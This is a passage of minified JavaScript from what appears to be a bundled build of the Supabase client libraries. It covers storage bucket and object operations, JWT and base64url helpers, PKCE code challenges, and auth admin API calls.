                        Object.assign({ expiresIn: n }, r != null && r.transform ? { transform: r.transform } : {}),
                        { headers: this.headers }
                    );
                const o = r != null && r.download ? `&download=${r.download === !0 ? "" : r.download}` : "";
                return (i = { signedUrl: encodeURI(`${this.url}${i.signedURL}${o}`) }), { data: i, error: null };
            } catch (s) {
                if (this.shouldThrowOnError) throw s;
                if (se(s)) return { data: null, error: s };
                throw s;
            }
        });
    }
    createSignedUrls(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            try {
                const s = yield ct(
                        this.fetch,
                        `${this.url}/object/sign/${this.bucketId}`,
                        { expiresIn: n, paths: e },
                        { headers: this.headers }
                    ),
                    i = r != null && r.download ? `&download=${r.download === !0 ? "" : r.download}` : "";
                return {
                    data: s.map((o) =>
                        Object.assign(Object.assign({}, o), {
                            signedUrl: o.signedURL ? encodeURI(`${this.url}${o.signedURL}${i}`) : null,
                        })
                    ),
                    error: null,
                };
            } catch (s) {
                if (this.shouldThrowOnError) throw s;
                if (se(s)) return { data: null, error: s };
                throw s;
            }
        });
    }
    download(e, n) {
        return _e(this, void 0, void 0, function* () {
            const s = typeof (n == null ? void 0 : n.transform) < "u" ? "render/image/authenticated" : "object",
                i = this.transformOptsToQueryString((n == null ? void 0 : n.transform) || {}),
                o = i ? `?${i}` : "";
            try {
                const a = this._getFinalPath(e);
                return {
                    data: yield (yield Mi(this.fetch, `${this.url}/${s}/${a}${o}`, {
                        headers: this.headers,
                        noResolveJson: !0,
                    })).blob(),
                    error: null,
                };
            } catch (a) {
                if (this.shouldThrowOnError) throw a;
                if (se(a)) return { data: null, error: a };
                throw a;
            }
        });
    }
    info(e) {
        return _e(this, void 0, void 0, function* () {
            const n = this._getFinalPath(e);
            try {
                const r = yield Mi(this.fetch, `${this.url}/object/info/${n}`, { headers: this.headers });
                return { data: rl(r), error: null };
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r)) return { data: null, error: r };
                throw r;
            }
        });
    }
    exists(e) {
        return _e(this, void 0, void 0, function* () {
            const n = this._getFinalPath(e);
            try {
                return (
                    yield Wy(this.fetch, `${this.url}/object/${n}`, { headers: this.headers }),
                    { data: !0, error: null }
                );
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r) && r instanceof nl) {
                    const s = r.originalError;
                    if ([400, 404].includes(s == null ? void 0 : s.status)) return { data: !1, error: r };
                }
                throw r;
            }
        });
    }
    getPublicUrl(e, n) {
        const r = this._getFinalPath(e),
            s = [],
            i = n != null && n.download ? `download=${n.download === !0 ? "" : n.download}` : "";
        i !== "" && s.push(i);
        const a = typeof (n == null ? void 0 : n.transform) < "u" ? "render/image" : "object",
            l = this.transformOptsToQueryString((n == null ? void 0 : n.transform) || {});
        l !== "" && s.push(l);
        let c = s.join("&");
        return c !== "" && (c = `?${c}`), { data: { publicUrl: encodeURI(`${this.url}/${a}/public/${r}${c}`) } };
    }
    remove(e) {
        return _e(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield Kf(
                        this.fetch,
                        `${this.url}/object/${this.bucketId}`,
                        { prefixes: e },
                        { headers: this.headers }
                    ),
                    error: null,
                };
            } catch (n) {
                if (this.shouldThrowOnError) throw n;
                if (se(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
    list(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            try {
                const s = Object.assign(Object.assign(Object.assign({}, Hy), n), { prefix: e || "" });
                return {
                    data: yield ct(
                        this.fetch,
                        `${this.url}/object/list/${this.bucketId}`,
                        s,
                        { headers: this.headers },
                        r
                    ),
                    error: null,
                };
            } catch (s) {
                if (this.shouldThrowOnError) throw s;
                if (se(s)) return { data: null, error: s };
                throw s;
            }
        });
    }
    listV2(e, n) {
        return _e(this, void 0, void 0, function* () {
            try {
                const r = Object.assign({}, e);
                return {
                    data: yield ct(
                        this.fetch,
                        `${this.url}/object/list-v2/${this.bucketId}`,
                        r,
                        { headers: this.headers },
                        n
                    ),
                    error: null,
                };
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r)) return { data: null, error: r };
                throw r;
            }
        });
    }
    encodeMetadata(e) {
        return JSON.stringify(e);
    }
    toBase64(e) {
        return typeof Buffer < "u" ? Buffer.from(e).toString("base64") : btoa(e);
    }
    _getFinalPath(e) {
        return `${this.bucketId}/${e.replace(/^\/+/, "")}`;
    }
    _removeEmptyFolders(e) {
        return e.replace(/^\/|\/$/g, "").replace(/\/+/g, "/");
    }
    transformOptsToQueryString(e) {
        const n = [];
        return (
            e.width && n.push(`width=${e.width}`),
            e.height && n.push(`height=${e.height}`),
            e.resize && n.push(`resize=${e.resize}`),
            e.format && n.push(`format=${e.format}`),
            e.quality && n.push(`quality=${e.quality}`),
            n.join("&")
        );
    }
}
const Gy = "2.12.1",
    Ky = { "X-Client-Info": `storage-js/${Gy}` };
var On = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
class Qy {
    constructor(e, n = {}, r, s) {
        this.shouldThrowOnError = !1;
        const i = new URL(e);
        s != null &&
            s.useNewHostname &&
            /supabase\.(co|in|red)$/.test(i.hostname) &&
            !i.hostname.includes("storage.supabase.") &&
            (i.hostname = i.hostname.replace("supabase.", "storage.supabase.")),
            (this.url = i.href),
            (this.headers = Object.assign(Object.assign({}, Ky), n)),
            (this.fetch = Gf(r));
    }
    throwOnError() {
        return (this.shouldThrowOnError = !0), this;
    }
    listBuckets() {
        return On(this, void 0, void 0, function* () {
            try {
                return { data: yield Mi(this.fetch, `${this.url}/bucket`, { headers: this.headers }), error: null };
            } catch (e) {
                if (this.shouldThrowOnError) throw e;
                if (se(e)) return { data: null, error: e };
                throw e;
            }
        });
    }
    getBucket(e) {
        return On(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield Mi(this.fetch, `${this.url}/bucket/${e}`, { headers: this.headers }),
                    error: null,
                };
            } catch (n) {
                if (this.shouldThrowOnError) throw n;
                if (se(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
    createBucket(e, n = { public: !1 }) {
        return On(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield ct(
                        this.fetch,
                        `${this.url}/bucket`,
                        {
                            id: e,
                            name: e,
                            type: n.type,
                            public: n.public,
                            file_size_limit: n.fileSizeLimit,
                            allowed_mime_types: n.allowedMimeTypes,
                        },
                        { headers: this.headers }
                    ),
                    error: null,
                };
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r)) return { data: null, error: r };
                throw r;
            }
        });
    }
    updateBucket(e, n) {
        return On(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield sl(
                        this.fetch,
                        `${this.url}/bucket/${e}`,
                        {
                            id: e,
                            name: e,
                            public: n.public,
                            file_size_limit: n.fileSizeLimit,
                            allowed_mime_types: n.allowedMimeTypes,
                        },
                        { headers: this.headers }
                    ),
                    error: null,
                };
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r)) return { data: null, error: r };
                throw r;
            }
        });
    }
    emptyBucket(e) {
        return On(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield ct(this.fetch, `${this.url}/bucket/${e}/empty`, {}, { headers: this.headers }),
                    error: null,
                };
            } catch (n) {
                if (this.shouldThrowOnError) throw n;
                if (se(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
    deleteBucket(e) {
        return On(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield Kf(this.fetch, `${this.url}/bucket/${e}`, {}, { headers: this.headers }),
                    error: null,
                };
            } catch (n) {
                if (this.shouldThrowOnError) throw n;
                if (se(n)) return { data: null, error: n };
                throw n;
            }
        });
    }
}
class Jy extends Qy {
    constructor(e, n = {}, r, s) {
        super(e, n, r, s);
    }
    from(e) {
        return new qy(this.url, this.headers, e, this.fetch);
    }
}
const Xy = "2.57.4";
let Ar = "";
typeof Deno < "u"
    ? (Ar = "deno")
    : typeof document < "u"
      ? (Ar = "web")
      : typeof navigator < "u" && navigator.product === "ReactNative"
        ? (Ar = "react-native")
        : (Ar = "node");
const Yy = { "X-Client-Info": `supabase-js-${Ar}/${Xy}` },
    Zy = { headers: Yy },
    ex = { schema: "public" },
    tx = { autoRefreshToken: !0, persistSession: !0, detectSessionInUrl: !0, flowType: "implicit" },
    nx = {};
var rx = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
const sx = (t) => {
        let e;
        return t ? (e = t) : typeof fetch > "u" ? (e = $f) : (e = fetch), (...n) => e(...n);
    },
    ix = () => (typeof Headers > "u" ? If : Headers),
    ox = (t, e, n) => {
        const r = sx(n),
            s = ix();
        return (i, o) =>
            rx(void 0, void 0, void 0, function* () {
                var a;
                const l = (a = yield e()) !== null && a !== void 0 ? a : t;
                let c = new s(o == null ? void 0 : o.headers);
                return (
                    c.has("apikey") || c.set("apikey", t),
                    c.has("Authorization") || c.set("Authorization", `Bearer ${l}`),
                    r(i, Object.assign(Object.assign({}, o), { headers: c }))
                );
            });
    };
var ax = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
function lx(t) {
    return t.endsWith("/") ? t : t + "/";
}
function ux(t, e) {
    var n, r;
    const { db: s, auth: i, realtime: o, global: a } = t,
        { db: l, auth: c, realtime: d, global: h } = e,
        f = {
            db: Object.assign(Object.assign({}, l), s),
            auth: Object.assign(Object.assign({}, c), i),
            realtime: Object.assign(Object.assign({}, d), o),
            storage: {},
            global: Object.assign(Object.assign(Object.assign({}, h), a), {
                headers: Object.assign(
                    Object.assign({}, (n = h == null ? void 0 : h.headers) !== null && n !== void 0 ? n : {}),
                    (r = a == null ? void 0 : a.headers) !== null && r !== void 0 ? r : {}
                ),
            }),
            accessToken: () =>
                ax(this, void 0, void 0, function* () {
                    return "";
                }),
        };
    return t.accessToken ? (f.accessToken = t.accessToken) : delete f.accessToken, f;
}
function cx(t) {
    const e = t == null ? void 0 : t.trim();
    if (!e) throw new Error("supabaseUrl is required.");
    if (!e.match(/^https?:\/\//i)) throw new Error("Invalid supabaseUrl: Must be a valid HTTP or HTTPS URL.");
    try {
        return new URL(lx(e));
    } catch {
        throw Error("Invalid supabaseUrl: Provided URL is malformed.");
    }
}
const Qf = "2.71.1",
    Mn = 30 * 1e3,
    il = 3,
    Xo = il * Mn,
    dx = "http://localhost:9999",
    hx = "supabase.auth.token",
    fx = { "X-Client-Info": `gotrue-js/${Qf}` },
    ol = "X-Supabase-Api-Version",
    Jf = { "2024-01-01": { timestamp: Date.parse("2024-01-01T00:00:00.0Z"), name: "2024-01-01" } },
    px = /^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,
    mx = 10 * 60 * 1e3;
class pu extends Error {
    constructor(e, n, r) {
        super(e), (this.__isAuthError = !0), (this.name = "AuthError"), (this.status = n), (this.code = r);
    }
}
function O(t) {
    return typeof t == "object" && t !== null && "__isAuthError" in t;
}
class gx extends pu {
    constructor(e, n, r) {
        super(e, n, r), (this.name = "AuthApiError"), (this.status = n), (this.code = r);
    }
}
function vx(t) {
    return O(t) && t.name === "AuthApiError";
}
class Xf extends pu {
    constructor(e, n) {
        super(e), (this.name = "AuthUnknownError"), (this.originalError = n);
    }
}
class nn extends pu {
    constructor(e, n, r, s) {
        super(e, r, s), (this.name = n), (this.status = r);
    }
}
class $t extends nn {
    constructor() {
        super("Auth session missing!", "AuthSessionMissingError", 400, void 0);
    }
}
function yx(t) {
    return O(t) && t.name === "AuthSessionMissingError";
}
class qs extends nn {
    constructor() {
        super("Auth session or user missing", "AuthInvalidTokenResponseError", 500, void 0);
    }
}
class Gs extends nn {
    constructor(e) {
        super(e, "AuthInvalidCredentialsError", 400, void 0);
    }
}
class Ks extends nn {
    constructor(e, n = null) {
        super(e, "AuthImplicitGrantRedirectError", 500, void 0), (this.details = null), (this.details = n);
    }
    toJSON() {
        return { name: this.name, message: this.message, status: this.status, details: this.details };
    }
}
function xx(t) {
    return O(t) && t.name === "AuthImplicitGrantRedirectError";
}
class qc extends nn {
    constructor(e, n = null) {
        super(e, "AuthPKCEGrantCodeExchangeError", 500, void 0), (this.details = null), (this.details = n);
    }
    toJSON() {
        return { name: this.name, message: this.message, status: this.status, details: this.details };
    }
}
class al extends nn {
    constructor(e, n) {
        super(e, "AuthRetryableFetchError", n, void 0);
    }
}
function Yo(t) {
    return O(t) && t.name === "AuthRetryableFetchError";
}
class Gc extends nn {
    constructor(e, n, r) {
        super(e, "AuthWeakPasswordError", n, "weak_password"), (this.reasons = r);
    }
}
class ll extends nn {
    constructor(e) {
        super(e, "AuthInvalidJwtError", 400, "invalid_jwt");
    }
}
const Ui = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),
    Kc = ` 	
\r=`.split(""),
    wx = (() => {
        const t = new Array(128);
        for (let e = 0; e < t.length; e += 1) t[e] = -1;
        for (let e = 0; e < Kc.length; e += 1) t[Kc[e].charCodeAt(0)] = -2;
        for (let e = 0; e < Ui.length; e += 1) t[Ui[e].charCodeAt(0)] = e;
        return t;
    })();
function Qc(t, e, n) {
    if (t !== null)
        for (e.queue = (e.queue << 8) | t, e.queuedBits += 8; e.queuedBits >= 6; ) {
            const r = (e.queue >> (e.queuedBits - 6)) & 63;
            n(Ui[r]), (e.queuedBits -= 6);
        }
    else if (e.queuedBits > 0)
        for (e.queue = e.queue << (6 - e.queuedBits), e.queuedBits = 6; e.queuedBits >= 6; ) {
            const r = (e.queue >> (e.queuedBits - 6)) & 63;
            n(Ui[r]), (e.queuedBits -= 6);
        }
}
function Yf(t, e, n) {
    const r = wx[t];
    if (r > -1)
        for (e.queue = (e.queue << 6) | r, e.queuedBits += 6; e.queuedBits >= 8; )
            n((e.queue >> (e.queuedBits - 8)) & 255), (e.queuedBits -= 8);
    else {
        if (r === -2) return;
        throw new Error(`Invalid Base64-URL character "${String.fromCharCode(t)}"`);
    }
}
function Jc(t) {
    const e = [],
        n = (o) => {
            e.push(String.fromCodePoint(o));
        },
        r = { utf8seq: 0, codepoint: 0 },
        s = { queue: 0, queuedBits: 0 },
        i = (o) => {
            kx(o, r, n);
        };
    for (let o = 0; o < t.length; o += 1) Yf(t.charCodeAt(o), s, i);
    return e.join("");
}
function _x(t, e) {
    if (t <= 127) {
        e(t);
        return;
    } else if (t <= 2047) {
        e(192 | (t >> 6)), e(128 | (t & 63));
        return;
    } else if (t <= 65535) {
        e(224 | (t >> 12)), e(128 | ((t >> 6) & 63)), e(128 | (t & 63));
        return;
    } else if (t <= 1114111) {
        e(240 | (t >> 18)), e(128 | ((t >> 12) & 63)), e(128 | ((t >> 6) & 63)), e(128 | (t & 63));
        return;
    }
    throw new Error(`Unrecognized Unicode codepoint: ${t.toString(16)}`);
}
function bx(t, e) {
    for (let n = 0; n < t.length; n += 1) {
        let r = t.charCodeAt(n);
        if (r > 55295 && r <= 56319) {
            const s = ((r - 55296) * 1024) & 65535;
            (r = (((t.charCodeAt(n + 1) - 56320) & 65535) | s) + 65536), (n += 1);
        }
        _x(r, e);
    }
}
function kx(t, e, n) {
    if (e.utf8seq === 0) {
        if (t <= 127) {
            n(t);
            return;
        }
        for (let r = 1; r < 6; r += 1)
            if (!((t >> (7 - r)) & 1)) {
                e.utf8seq = r;
                break;
            }
        if (e.utf8seq === 2) e.codepoint = t & 31;
        else if (e.utf8seq === 3) e.codepoint = t & 15;
        else if (e.utf8seq === 4) e.codepoint = t & 7;
        else throw new Error("Invalid UTF-8 sequence");
        e.utf8seq -= 1;
    } else if (e.utf8seq > 0) {
        if (t <= 127) throw new Error("Invalid UTF-8 sequence");
        (e.codepoint = (e.codepoint << 6) | (t & 63)), (e.utf8seq -= 1), e.utf8seq === 0 && n(e.codepoint);
    }
}
function Sx(t) {
    const e = [],
        n = { queue: 0, queuedBits: 0 },
        r = (s) => {
            e.push(s);
        };
    for (let s = 0; s < t.length; s += 1) Yf(t.charCodeAt(s), n, r);
    return new Uint8Array(e);
}
function jx(t) {
    const e = [];
    return bx(t, (n) => e.push(n)), new Uint8Array(e);
}
function Ex(t) {
    const e = [],
        n = { queue: 0, queuedBits: 0 },
        r = (s) => {
            e.push(s);
        };
    return t.forEach((s) => Qc(s, n, r)), Qc(null, n, r), e.join("");
}
function Nx(t) {
    return Math.round(Date.now() / 1e3) + t;
}
function Cx() {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t) {
        const e = (Math.random() * 16) | 0;
        return (t == "x" ? e : (e & 3) | 8).toString(16);
    });
}
const Xe = () => typeof window < "u" && typeof document < "u",
    on = { tested: !1, writable: !1 },
    Zf = () => {
        if (!Xe()) return !1;
        try {
            if (typeof globalThis.localStorage != "object") return !1;
        } catch {
            return !1;
        }
        if (on.tested) return on.writable;
        const t = `lswt-${Math.random()}${Math.random()}`;
        try {
            globalThis.localStorage.setItem(t, t),
                globalThis.localStorage.removeItem(t),
                (on.tested = !0),
                (on.writable = !0);
        } catch {
            (on.tested = !0), (on.writable = !1);
        }
        return on.writable;
    };
function Px(t) {
    const e = {},
        n = new URL(t);
    if (n.hash && n.hash[0] === "#")
        try {
            new URLSearchParams(n.hash.substring(1)).forEach((s, i) => {
                e[i] = s;
            });
        } catch {}
    return (
        n.searchParams.forEach((r, s) => {
            e[s] = r;
        }),
        e
    );
}
const ep = (t) => {
        let e;
        return (
            t
                ? (e = t)
                : typeof fetch > "u"
                  ? (e = (...n) =>
                        bs(
                            async () => {
                                const { default: r } = await Promise.resolve().then(() => gr);
                                return { default: r };
                            },
                            void 0
                        ).then(({ default: r }) => r(...n)))
                  : (e = fetch),
            (...n) => e(...n)
        );
    },
    Tx = (t) =>
        typeof t == "object" && t !== null && "status" in t && "ok" in t && "json" in t && typeof t.json == "function",
    Un = async (t, e, n) => {
        await t.setItem(e, JSON.stringify(n));
    },
    an = async (t, e) => {
        const n = await t.getItem(e);
        if (!n) return null;
        try {
            return JSON.parse(n);
        } catch {
            return n;
        }
    },
    Ot = async (t, e) => {
        await t.removeItem(e);
    };
class ao {
    constructor() {
        this.promise = new ao.promiseConstructor((e, n) => {
            (this.resolve = e), (this.reject = n);
        });
    }
}
ao.promiseConstructor = Promise;
function Zo(t) {
    const e = t.split(".");
    if (e.length !== 3) throw new ll("Invalid JWT structure");
    for (let r = 0; r < e.length; r++) if (!px.test(e[r])) throw new ll("JWT not in base64url format");
    return {
        header: JSON.parse(Jc(e[0])),
        payload: JSON.parse(Jc(e[1])),
        signature: Sx(e[2]),
        raw: { header: e[0], payload: e[1] },
    };
}
async function Rx(t) {
    return await new Promise((e) => {
        setTimeout(() => e(null), t);
    });
}
function Ox(t, e) {
    return new Promise((r, s) => {
        (async () => {
            for (let i = 0; i < 1 / 0; i++)
                try {
                    const o = await t(i);
                    if (!e(i, null, o)) {
                        r(o);
                        return;
                    }
                } catch (o) {
                    if (!e(i, o)) {
                        s(o);
                        return;
                    }
                }
        })();
    });
}
function $x(t) {
    return ("0" + t.toString(16)).substr(-2);
}
function Ix() {
    const e = new Uint32Array(56);
    if (typeof crypto > "u") {
        const n = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",
            r = n.length;
        let s = "";
        for (let i = 0; i < 56; i++) s += n.charAt(Math.floor(Math.random() * r));
        return s;
    }
    return crypto.getRandomValues(e), Array.from(e, $x).join("");
}
async function Ax(t) {
    const n = new TextEncoder().encode(t),
        r = await crypto.subtle.digest("SHA-256", n),
        s = new Uint8Array(r);
    return Array.from(s)
        .map((i) => String.fromCharCode(i))
        .join("");
}
async function Lx(t) {
    if (!(typeof crypto < "u" && typeof crypto.subtle < "u" && typeof TextEncoder < "u"))
        return (
            console.warn(
                "WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."
            ),
            t
        );
    const n = await Ax(t);
    return btoa(n).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
async function $n(t, e, n = !1) {
    const r = Ix();
    let s = r;
    n && (s += "/PASSWORD_RECOVERY"), await Un(t, `${e}-code-verifier`, s);
    const i = await Lx(r);
    return [i, r === i ? "plain" : "s256"];
}
const Mx = /^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;
function Ux(t) {
    const e = t.headers.get(ol);
    if (!e || !e.match(Mx)) return null;
    try {
        return new Date(`${e}T00:00:00.0Z`);
    } catch {
        return null;
    }
}
function Dx(t) {
    if (!t) throw new Error("Missing exp claim");
    const e = Math.floor(Date.now() / 1e3);
    if (t <= e) throw new Error("JWT has expired");
}
function zx(t) {
    switch (t) {
        case "RS256":
            return { name: "RSASSA-PKCS1-v1_5", hash: { name: "SHA-256" } };
        case "ES256":
            return { name: "ECDSA", namedCurve: "P-256", hash: { name: "SHA-256" } };
        default:
            throw new Error("Invalid alg claim");
    }
}
const Fx = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
function In(t) {
    if (!Fx.test(t)) throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not");
}
function ea() {
    const t = {};
    return new Proxy(t, {
        get: (e, n) => {
            if (n === "__isUserNotAvailableProxy") return !0;
            if (typeof n == "symbol") {
                const r = n.toString();
                if (
                    r === "Symbol(Symbol.toPrimitive)" ||
                    r === "Symbol(Symbol.toStringTag)" ||
                    r === "Symbol(util.inspect.custom)"
                )
                    return;
            }
            throw new Error(
                `@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${n}" property of the session object is not supported. Please use getUser() instead.`
            );
        },
        set: (e, n) => {
            throw new Error(
                `@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${n}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`
            );
        },
        deleteProperty: (e, n) => {
            throw new Error(
                `@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${n}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`
            );
        },
    });
}
function Xc(t) {
    return JSON.parse(JSON.stringify(t));
}
var Bx = function (t, e) {
    var n = {};
    for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && e.indexOf(r) < 0 && (n[r] = t[r]);
    if (t != null && typeof Object.getOwnPropertySymbols == "function")
        for (var s = 0, r = Object.getOwnPropertySymbols(t); s < r.length; s++)
            e.indexOf(r[s]) < 0 && Object.prototype.propertyIsEnumerable.call(t, r[s]) && (n[r[s]] = t[r[s]]);
    return n;
};
const cn = (t) => t.msg || t.message || t.error_description || t.error || JSON.stringify(t),
    Vx = [502, 503, 504];
async function Yc(t) {
    var e;
    if (!Tx(t)) throw new al(cn(t), 0);
    if (Vx.includes(t.status)) throw new al(cn(t), t.status);
    let n;
    try {
        n = await t.json();
    } catch (i) {
        throw new Xf(cn(i), i);
    }
    let r;
    const s = Ux(t);
    if (
        (s && s.getTime() >= Jf["2024-01-01"].timestamp && typeof n == "object" && n && typeof n.code == "string"
            ? (r = n.code)
            : typeof n == "object" && n && typeof n.error_code == "string" && (r = n.error_code),
        r)
    ) {
        if (r === "weak_password")
            throw new Gc(cn(n), t.status, ((e = n.weak_password) === null || e === void 0 ? void 0 : e.reasons) || []);
        if (r === "session_not_found") throw new $t();
    } else if (
        typeof n == "object" &&
        n &&
        typeof n.weak_password == "object" &&
        n.weak_password &&
        Array.isArray(n.weak_password.reasons) &&
        n.weak_password.reasons.length &&
        n.weak_password.reasons.reduce((i, o) => i && typeof o == "string", !0)
    )
        throw new Gc(cn(n), t.status, n.weak_password.reasons);
    throw new gx(cn(n), t.status || 500, r);
}
const Wx = (t, e, n, r) => {
    const s = { method: t, headers: (e == null ? void 0 : e.headers) || {} };
    return t === "GET"
        ? s
        : ((s.headers = Object.assign(
              { "Content-Type": "application/json;charset=UTF-8" },
              e == null ? void 0 : e.headers
          )),
          (s.body = JSON.stringify(r)),
          Object.assign(Object.assign({}, s), n));
};
async function A(t, e, n, r) {
    var s;
    const i = Object.assign({}, r == null ? void 0 : r.headers);
    i[ol] || (i[ol] = Jf["2024-01-01"].name), r != null && r.jwt && (i.Authorization = `Bearer ${r.jwt}`);
    const o = (s = r == null ? void 0 : r.query) !== null && s !== void 0 ? s : {};
    r != null && r.redirectTo && (o.redirect_to = r.redirectTo);
    const a = Object.keys(o).length ? "?" + new URLSearchParams(o).toString() : "",
        l = await Hx(
            t,
            e,
            n + a,
            { headers: i, noResolveJson: r == null ? void 0 : r.noResolveJson },
            {},
            r == null ? void 0 : r.body
        );
    return r != null && r.xform ? (r == null ? void 0 : r.xform(l)) : { data: Object.assign({}, l), error: null };
}
async function Hx(t, e, n, r, s, i) {
    const o = Wx(e, r, s, i);
    let a;
    try {
        a = await t(n, Object.assign({}, o));
    } catch (l) {
        throw (console.error(l), new al(cn(l), 0));
    }
    if ((a.ok || (await Yc(a)), r != null && r.noResolveJson)) return a;
    try {
        return await a.json();
    } catch (l) {
        await Yc(l);
    }
}
function mt(t) {
    var e;
    let n = null;
    Qx(t) && ((n = Object.assign({}, t)), t.expires_at || (n.expires_at = Nx(t.expires_in)));
    const r = (e = t.user) !== null && e !== void 0 ? e : t;
    return { data: { session: n, user: r }, error: null };
}
function Zc(t) {
    const e = mt(t);
    return (
        !e.error &&
            t.weak_password &&
            typeof t.weak_password == "object" &&
            Array.isArray(t.weak_password.reasons) &&
            t.weak_password.reasons.length &&
            t.weak_password.message &&
            typeof t.weak_password.message == "string" &&
            t.weak_password.reasons.reduce((n, r) => n && typeof r == "string", !0) &&
            (e.data.weak_password = t.weak_password),
        e
    );
}
function Ut(t) {
    var e;
    return { data: { user: (e = t.user) !== null && e !== void 0 ? e : t }, error: null };
}
function qx(t) {
    return { data: t, error: null };
}
function Gx(t) {
    const { action_link: e, email_otp: n, hashed_token: r, redirect_to: s, verification_type: i } = t,
        o = Bx(t, ["action_link", "email_otp", "hashed_token", "redirect_to", "verification_type"]),
        a = { action_link: e, email_otp: n, hashed_token: r, redirect_to: s, verification_type: i },
        l = Object.assign({}, o);
    return { data: { properties: a, user: l }, error: null };
}
function Kx(t) {
    return t;
}
function Qx(t) {
    return t.access_token && t.refresh_token && t.expires_in;
}
const ta = ["global", "local", "others"];
var Jx = function (t, e) {
    var n = {};
    for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && e.indexOf(r) < 0 && (n[r] = t[r]);
    if (t != null && typeof Object.getOwnPropertySymbols == "function")
        for (var s = 0, r = Object.getOwnPropertySymbols(t); s < r.length; s++)
            e.indexOf(r[s]) < 0 && Object.prototype.propertyIsEnumerable.call(t, r[s]) && (n[r[s]] = t[r[s]]);
    return n;
};
class Xx {
    constructor({ url: e = "", headers: n = {}, fetch: r }) {
        (this.url = e),
            (this.headers = n),
            (this.fetch = ep(r)),
            (this.mfa = { listFactors: this._listFactors.bind(this), deleteFactor: this._deleteFactor.bind(this) });
    }
    async signOut(e, n = ta[0]) {
        if (ta.indexOf(n) < 0) throw new Error(`@supabase/auth-js: Parameter scope must be one of ${ta.join(", ")}`);
        try {
            return (
                await A(this.fetch, "POST", `${this.url}/logout?scope=${n}`, {
                    headers: this.headers,
                    jwt: e,
                    noResolveJson: !0,
                }),
                { data: null, error: null }
            );
        } catch (r) {
            if (O(r)) return { data: null, error: r };
            throw r;
        }
    }
    async inviteUserByEmail(e, n = {}) {
        try {
            return await A(this.fetch, "POST", `${this.url}/invite`, {
                body: { email: e, data: n.data },
                headers: this.headers,
                redirectTo: n.redirectTo,
                xform: Ut,
            });
        } catch (r) {
            if (O(r)) return { data: { user: null }, error: r };
            throw r;
        }
    }
    async generateLink(e) {
        try {
            const { options: n } = e,
                r = Jx(e, ["options"]),
                s = Object.assign(Object.assign({}, r), n);
            return (
                "newEmail" in r && ((s.new_email = r == null ? void 0 : r.newEmail), delete s.newEmail),
                await A(this.fetch, "POST", `${this.url}/admin/generate_link`, {
                    body: s,
                    headers: this.headers,
                    xform: Gx,
                    redirectTo: n == null ? void 0 : n.redirectTo,
                })
            );
        } catch (n) {
            if (O(n)) return { data: { properties: null, user: null }, error: n };
            throw n;
        }
    }
    async createUser(e) {
        try {
            return await A(this.fetch, "POST", `${this.url}/admin/users`, {
                body: e,
                headers: this.headers,
                xform: Ut,
            });
        } catch (n) {
            if (O(n)) return { data: { user: null }, error: n };
            throw n;
        }
    }
    async listUsers(e) {
        var n, r, s, i, o, a, l;
        try {
            const c = { nextPage: null, lastPage: 0, total: 0 },
                d = await A(this.fetch, "GET", `${this.url}/admin/users`, {
                    headers: this.headers,
                    noResolveJson: !0,
                    query: {
                        page:
